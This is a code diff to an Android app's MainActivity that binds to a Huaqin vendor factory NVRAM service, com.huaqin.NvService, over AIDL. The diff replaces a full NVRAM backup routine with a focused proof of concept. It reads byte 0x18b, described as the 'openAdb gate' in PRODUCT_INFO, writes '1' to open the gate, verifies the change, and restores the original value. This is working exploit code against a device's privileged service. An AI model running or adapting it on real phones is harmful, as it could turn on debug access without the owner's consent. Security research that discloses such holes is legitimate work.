@@ -15,7 +15,7 @@ public class MainActivity extends Activity {
     static final String PKG = "com.huaqin.NvService";
     static final String CLS = "com.huaqin.NvService.FactoryNvramService";
     static final String DESC = "aidl.NvAidlService";
-    static final int SEG = 128;
+    static final int DEPTH = 0x18b;   // 395, the openAdb gate index in PRODUCT_INFO
 
     static IBinder svc;
 
@@ -40,17 +40,6 @@ public class MainActivity extends Activity {
         } catch (Throwable t) {
             return null;
         }
-    }
-
-    // read whole 0..1024 in SEG chunks, concat
-    static String readAll() {
-        StringBuilder sb = new StringBuilder();
-        for (int s = 0; s < 1024; s += SEG) {
-            String r = readHex(s, s + SEG);
-            if (r == null) r = "";
-            sb.append(r);
-        }
-        return sb.toString();
     }
 
     static int write(int idx, int val) {
@@ -93,46 +82,32 @@ public class MainActivity extends Activity {
                     new Thread() {
                         public void run() {
                             try {
-                                int T = 55;
                                 log("desc=" + svc.getInterfaceDescriptor());
 
-                                // STEP0 backup (segmented)
-                                String before = readAll();
-                                log("BACKUP len=" + before.length());
-                                log("BACKUP[0..64]=" + before.substring(0, Math.min(64, before.length())));
-
-                                int v0 = byteAt(T);
-                                log("TARGET idx=" + T + " orig=0x" + Integer.toHexString(v0)
+                                // STEP0: read gate byte (0x18b = 395)
+                                int v0 = byteAt(DEPTH);
+                                log("GATE idx=" + DEPTH + " current=0x" + Integer.toHexString(v0)
                                         + " ('" + (char) v0 + "')");
+                                log("  readFlagsForMTK would return: "
+                                        + (v0 == 0x31 ? "1 (openAdb FIRES)" : v0 == 0x32 ? "2 (no action)" : "-1"));
 
-                                // STEP1 change to a DIFFERENT value
-                                int newSel = (v0 == 0x31) ? 2 : 1;
-                                log("STEP1 write idx=" + T + " selector=" + newSel);
-                                write(T, newSel);
-                                int v1 = byteAt(T);
-                                log("VERIFY1 idx=" + T + " = 0x" + Integer.toHexString(v1)
-                                        + " ('" + (char) v1 + "') changed=" + (v1 != v0));
+                                // STEP1: set gate to '1'  (selector 1 -> '1')
+                                log("STEP1 set gate -> 1 (this satisfies openAdb condition)");
+                                write(DEPTH, 1);
+                                int v1 = byteAt(DEPTH);
+                                log("  VERIFY gate now=0x" + Integer.toHexString(v1)
+                                        + " ('" + (char) v1 + "')  gateOpen=" + (v1 == 0x31));
 
-                                // STEP2 restore original
+                                // STEP2: restore original value
                                 int backSel = (v0 == 0x31) ? 1 : (v0 == 0x32 ? 2 : 0);
-                                log("STEP2 restore idx=" + T + " selector=" + backSel);
-                                write(T, backSel);
-                                int v2 = byteAt(T);
-                                log("VERIFY2 idx=" + T + " = 0x" + Integer.toHexString(v2)
-                                        + " ('" + (char) v2 + "') restored=" + (v2 == v0));
+                                log("STEP2 restore gate -> selector " + backSel);
+                                write(DEPTH, backSel);
+                                int v2 = byteAt(DEPTH);
+                                log("  VERIFY gate now=0x" + Integer.toHexString(v2)
+                                        + " ('" + (char) v2 + "')  restored=" + (v2 == v0));
 
-                                String after = readAll();
-                                log("FINAL identical=" + before.equals(after));
-                                if (!before.equals(after)) {
-                                    for (int k = 0; k < Math.min(before.length(), after.length()); k++) {
-                                        if (before.charAt(k) != after.charAt(k)) {
-                                            log("DIFF at hexchar " + k + " (byte " + (k/2) + ") "
-                                                    + before.charAt(k) + " -> " + after.charAt(k));
-                                            break;
-                                        }
-                                    }
-                                }
-                                log("SERIAL=" + readHex(1, 15));
+                                // final: confirm wider region intact
+                                log("REGION 384..448 = " + readHex(384, 448));
                             } catch (Throwable t) {
                                 log("EX: " + t);
                             }
